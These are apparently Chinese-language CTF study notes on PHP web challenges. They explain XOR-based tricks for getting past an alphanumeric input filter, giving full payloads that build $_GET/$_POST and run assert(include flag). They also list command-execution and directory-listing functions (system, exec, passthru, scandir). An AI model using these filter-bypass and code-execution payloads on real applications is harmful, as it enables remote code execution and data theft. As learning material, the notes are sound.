题目限制：$code过滤掉了字符串和数字，也就是说我们只能采用非常字符爆出flag
绕过方式：
PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。还可以利用下划线_这个没被过滤的元素构建变量，执行我们的代码：
1.构建_GET类型的payload：
payload：
?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=include%20flag
{讲解}：
如果是?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=getFlag
则它们分别代表：
$_="`{{{"^"?<>/"; //_GET
${$_}[_](${$_}[__]); //$_GET[_]($_GET[__])
&_=getFlag //执行函数 eval("getFlag(null)")，所以上面的payload的意思即为eval("assert(include flag)")
*assert()函数会执行第一个参数字符串中的php代码，如果发生错误会扔出第二个参数exception并且返回False
2.构建_POST类型的payload：
payload：
<?php
@$_++; //$_=NULL=0  $_++=1
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); //_POST
${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?>
*同时，post参数：0=assert&1=include%20flag
{讲解}：
<?php
    var_dump('#'^'|'); //得到字符 _
    var_dump('.'^'~'); //得到字符 P
	var_dump('/'^'`'); //得到字符 0
	var_dump('|'^'/'); //得到字符 S
	var_dump('{'^'/'); //得到字符 T
	$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
	//变量$__值为字符串'_POST'
?>
3.第二种get：
构造 getFlag 的异或字符串 code=$_="%40%3e%2b%3b%2c%3c%3a"^"%27%5b%5f%7d%40%5d%5d";$_(); 
注入一句话${_GET}[_](${_GET}[__]) 
如果下划线_被禁用，使用大于等于 %7F 的字符

说明：扫描目录中所有文件并返回文件名数组的函数。scandir
类目：php函数收集
考点：php函数收集
漏洞函数：scandir
漏洞：scandir扫描目录中所有文件并返回文件名数组的函数
注意要点：null
题目限制：使用php函数
绕过方式：
scandir ( string $directory , int $sorting_order = ? , resource $context = ? ) : array
var_dump(scandir('.'));
参数1为字符串格式的路径，任意路径；参数2默认的排序顺序是按字母升序排列。如果使用了可选参数 sorting_order（设为 1），则排序顺序是按字母降序排列；参数3context 参数的说明见手册中的 Streams API（https://www.php.net/manual/zh/ref.stream.php） 一章。
另一种读取目的方法是opendir()，然后readdir()，如下
if(  ( $dh = opendir($dir) ) !== null  )
     {
         while ( ( $file = readdir($dh) ) !== false  )
         {
             echo "filename: ".$file ." filetype : ".filetype($dir.$file)."<br/>";
         }
     }

说明：执行系统shell命令的函数。system、exec、passthru
类目：php函数收集
考点：php函数收集
漏洞函数：system、exec、passthru
漏洞：null
注意要点：null
题目限制：null
绕过方式：
1.system ( string $command , int &$return_var = ? ) : string
var_dump(system('ls'));
参数1是要执行的命令；参数2是如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。返回值成功则返回命令输出的最后一行， 失败则返回 false。
2.exec ( string $command , array &$output = ? , int &$return_var = ? ) : string
var_dump(exec('ls'));
参数1是要执行的命令；参数2是如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置；参数3是如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。返回值是命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数，如果想要获取命令的输出内容， 请确保使用 output 参数。
3.passthru ( string $command , int &$return_var = ? ) : void
passthru("cat myfile.zip",$err);
参数1是要执行的命令；参数2是如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。
